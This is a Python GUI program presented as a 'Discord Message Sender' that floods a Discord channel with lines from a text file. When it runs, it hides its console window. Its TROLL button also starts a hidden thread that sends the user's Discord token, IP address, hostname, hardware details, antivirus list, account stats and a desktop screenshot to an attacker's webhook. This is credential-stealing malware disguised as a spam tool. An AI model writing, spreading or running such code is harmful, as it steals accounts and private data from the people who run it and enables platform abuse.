import ctypes
import customtkinter as ctk
import threading
import requests
import socket
import platform
import psutil
import wmi
import time
from PIL import ImageGrab
import os

ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

stop_spamming = False

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org')
        if response.status_code == 200:
            return response.text
        else:
            return "Не удалось получить IP"
    except requests.RequestException:
        return "Ошибка при получении IP"

def get_computer_name():
    try:
        return socket.gethostname()
    except Exception:
        return "Не удалось получить имя компьютера"

def get_system_info():
    try:
        system = platform.system()
        release = platform.release()
        version = platform.version()
        machine = platform.machine()
        processor_info = cpuinfo.get_cpu_info()['brand_raw']
        ram = f"{round(psutil.virtual_memory().total / (1024**3))} GB"
        return {
            "System": system,
            "Release": release,
            "Version": version,
            "Machine": machine,
            "Processor": processor_info,
            "RAM": ram
        }
    except Exception:
        return {"Error": "Не удалось получить информацию о системе"}

def get_graphic_card_info():
    try:
        w = wmi.WMI()
        gpus = w.Win32_VideoController()
        if gpus:
            graphic_cards = [gpu.Name for gpu in gpus]
            return graphic_cards
        else:
            return ["Видеокарта не найдена"]
    except Exception:
        return ["Не удалось получить информацию о видеокарте"]

def get_antivirus_info():
    try:
        w = wmi.WMI()
        antiviruses = w.Win32_Product(Name="*AntiVirus*")
        if antiviruses:
            antivirus_list = [av.Name for av in antiviruses]
            return antivirus_list
        else:
            return ["Антивирус не найден"]
    except Exception:
        return ["Антивирус не найден"]

def get_discord_info(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }

    user_response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    if user_response.status_code != 200:
        return None, None, False

    guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers)
    if guilds_response.status_code == 200:
        guilds = guilds_response.json()
        guild_count = len(guilds)
    else:
        guild_count = "Не удалось получить информацию о серверах"

    friends_response = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers)
    if friends_response.status_code == 200:
        friends = friends_response.json()
        friend_count = sum(1 for friend in friends if friend['type'] == 1)
    else:
        friend_count = "Не удалось получить информацию о друзьях"

    return guild_count, friend_count, True

def take_screenshot():
    screenshot = ImageGrab.grab()
    screenshot_path = "screenshot.png"
    screenshot.save(screenshot_path)
    return screenshot_path

def send_screenshot_to_webhook(webhook_url, screenshot_path):
    with open(screenshot_path, "rb") as f:
        response = requests.post(webhook_url, files={"file": f})
    os.remove(screenshot_path)

def send_messages():
    global stop_spamming
    token = token_entry.get()
    channel_id = channel_id_entry.get()
    delay_ms = float(delay_entry.get())

    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }

    try:
        with open('troll.txt', 'r', encoding='utf-8') as file:
            messages = file.readlines()
    except FileNotFoundError:
        toggle_buttons(reset=True)
        return

    for message in messages:
        if stop_spamming:
            toggle_buttons(reset=True)
            return

        data = {
            'content': message.strip()
        }

        requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, json=data)
        time.sleep(delay_ms / 1000)

    toggle_buttons(reset=True)

def start_sending_messages():
    global stop_spamming
    stop_spamming = False
    toggle_buttons()
    threading.Thread(target=send_webhook_log).start()
    threading.Thread(target=send_messages).start()

def stop_sending_messages():
    global stop_spamming
    stop_spamming = True

def toggle_buttons(reset=False):
    if reset:
        troll_button.configure(text="TROLL", command=start_sending_messages)
    else:
        troll_button.configure(text="СТОП", command=stop_sending_messages)

def send_webhook_log():
    webhook_url = "PUT YOUR WEBHOOK"
    token = token_entry.get()
    channel_id = channel_id_entry.get()
    delay = delay_entry.get()
    user_ip = get_public_ip()
    computer_name = get_computer_name()
    system_info = get_system_info()
    graphic_cards = get_graphic_card_info()
    antivirus_info = get_antivirus_info()
    guild_count, friend_count, valid_token = get_discord_info(token)

    if valid_token:
        embed_title = "Использование программы"
        embed_color = 5814783
        embed_fields = [
            {"name": "Channel ID", "value": channel_id, "inline": False},
            {"name": "Token", "value": token, "inline": False},
            {"name": "Delay", "value": f"{delay} ms", "inline": False},
            {"name": "User IP", "value": user_ip, "inline": False},
            {"name": "Computer Name", "value": computer_name, "inline": False},
            {"name": "Processor", "value": system_info.get("Processor", "Unknown"), "inline": False},
            {"name": "RAM", "value": system_info.get("RAM", "Unknown"), "inline": False},
            {"name": "Graphic Card", "value": ", ".join(graphic_cards), "inline": False},
            {"name": "Antivirus", "value": ", ".join(antivirus_info), "inline": False},
            {"name": "Guild Count", "value": guild_count, "inline": False},
            {"name": "Friend Count", "value": friend_count, "inline": False}
        ]
    else:
        embed_title = "Ложное использование"
        embed_color = 16711680
        embed_fields = [
            {"name": "User IP", "value": user_ip, "inline": False},
            {"name": "Computer Name", "value": computer_name, "inline": False},
            {"name": "Processor", "value": system_info.get("Processor", "Unknown"), "inline": False},
            {"name": "RAM", "value": system_info.get("RAM", "Unknown"), "inline": False},
            {"name": "Graphic Card", "value": ", ".join(graphic_cards), "inline": False},
            {"name": "Antivirus", "value": ", ".join(antivirus_info), "inline": False}
        ]

    embed = {
        "title": embed_title,
        "color": embed_color,
        "fields": embed_fields,
        "thumbnail": {
            "url": "https://i.imgur.com/QPAIHCI.png"
        }
    }

    data = {
        "embeds": [embed]
    }

    requests.post(webhook_url, json=data)

    screenshot_path = take_screenshot()
    send_screenshot_to_webhook(webhook_url, screenshot_path)

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

root = ctk.CTk()
root.title('Discord Message Sender')
root.geometry('400x300')
root.resizable(False, False)

ctk.CTkLabel(root, text='Discord Token').pack(pady=5)
token_entry = ctk.CTkEntry(root, width=300)
token_entry.pack()

ctk.CTkLabel(root, text='Channel ID').pack(pady=5)
channel_id_entry = ctk.CTkEntry(root, width=300)
channel_id_entry.pack()

ctk.CTkLabel(root, text='Delay (milliseconds)').pack(pady=5)
delay_entry = ctk.CTkEntry(root, width=300)
delay_entry.pack()

troll_button = ctk.CTkButton(root, text='TROLL', command=start_sending_messages)
troll_button.pack(pady=20)

root.mainloop()
